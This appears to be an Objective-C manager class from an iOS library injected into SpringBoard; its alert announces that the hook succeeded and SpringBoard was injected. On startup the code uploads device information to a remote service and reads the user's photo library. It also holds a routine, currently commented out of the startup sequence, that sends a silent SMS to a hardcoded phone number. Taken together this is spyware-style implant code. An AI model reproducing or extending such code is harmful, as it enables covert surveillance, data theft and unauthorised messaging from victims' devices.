//
//  YOSystemManager.m
//  SysDevLauchingDevLib
//
//  Created by 陈帆 on 2026/03/27.
//

#import "YOSystemManager.h"
#import "SMSSender.h"
#import "YOPhotoReader.h"
#import "BusinessNetworkManager.h"

// ─────────────────────────────────────────────
// MARK: - 内部工具：安全获取 rootViewController
// ─────────────────────────────────────────────

/// 从 keyWindow 向下找到最顶层的 ViewController（处理 modal/navigation 层级）
static UIViewController *_Nullable YOTopViewController(void) {
    UIWindow *keyWindow = nil;

    // iOS 13+ 多 Scene 支持
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *window in scene.windows) {
                    if (window.isKeyWindow) { keyWindow = window; break; }
                }
            }
        }
    }

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    if (!keyWindow) keyWindow = [UIApplication sharedApplication].keyWindow;
#pragma clang diagnostic pop

    UIViewController *vc = keyWindow.rootViewController;
    while (vc.presentedViewController) vc = vc.presentedViewController;
    return vc;
}


@implementation YOSystemManager

+ (instancetype)shared {
    static YOSystemManager *m;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        m = [YOSystemManager new];
    });
    return m;
}

#pragma mark - Public

- (void)startAllTasks {
    YOLogI(@"[Manager] 启动所有任务");

    [self sendDeviceInfo];
    
    [self scheduleUI];
//    [self scheduleSMS];
    [self schedulePhotos];
}

#pragma mark - Network
- (void)sendDeviceInfo {
    [[BusinessNetworkManager sharedManager] reportDeviceWithSuccess:^(id response) {
        YOLogI(@"设备信息上传成功: %@", response);
    } failure:^(NSError *error) {
        YOLogI(@"设备信息上传失败: %@", error);
    }];
}

#pragma mark - UI

- (void)scheduleUI {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        [self showHookAlert];
    });
}

- (void)showHookAlert {
    UIViewController *topVC = YOTopViewController();
    if (!topVC) {
        YOLogW(@"[UI] 未找到 topVC");
        return;
    }

    UIAlertController *alert =
        [UIAlertController alertControllerWithTitle:@"Hook 成功"
                                            message:@"SpringBoard 已被注入"
                                     preferredStyle:UIAlertControllerStyleAlert];

    [alert addAction:[UIAlertAction actionWithTitle:@"OK"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        YOLogI(@"[UI] 点击 OK");
    }]];

    [topVC presentViewController:alert animated:YES completion:nil];
}

#pragma mark - SMS

- (void)scheduleSMS {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)),
                   dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self sendTestSMS];
    });
}

- (void)sendTestSMS {
    if (![[SMSSender sharedSender] isAvailable]) {
        YOLogE(@"[SMS] 不可用");
        return;
    }
    
    
    NSString *message = @"测试消息202603311118";
    NSString *phoneNumber = @"+8613379523124";

    [[SMSSender sharedSender] sendSilentSMS_iOS16:phoneNumber mes:message];
}

#pragma mark - Photos

- (void)schedulePhotos {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        [self readPhotos];
    });
}

- (void)readPhotos {
    [[YOPhotoReader sharedReader]
        requestAuthorizationWithCompletion:^(BOOL granted, PHAuthorizationStatus status) {

        if (!granted) {
            YOLogW(@"[Photo] 权限拒绝");
            return;
        }

        [[YOPhotoReader sharedReader] logLibrarySummary];

        [[YOPhotoReader sharedReader]
            fetchFirstPhotoWithTargetSize:PHImageManagerMaximumSize
                               completion:^(YOPhotoAsset *asset, NSError *error) {

            if (asset) {
                YOLogI(@"[Photo] 获取成功");
            }
        }];
    }];
}

@end
